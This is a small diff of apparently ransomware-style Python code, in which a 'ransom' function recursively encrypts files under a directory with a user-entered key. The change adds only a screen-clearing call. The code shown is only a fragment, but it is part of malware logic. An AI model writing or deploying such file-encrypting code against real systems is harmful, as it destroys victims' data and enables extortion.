@@ -18,6 +18,7 @@ def ransom(way):
         else:
             cipher(f"{way}/{dir}",key)
 
+os.system('clear')
 exclu=["ransom.py","save.py"]
 path="__PATH__"
 key = input("Enter a key: ")
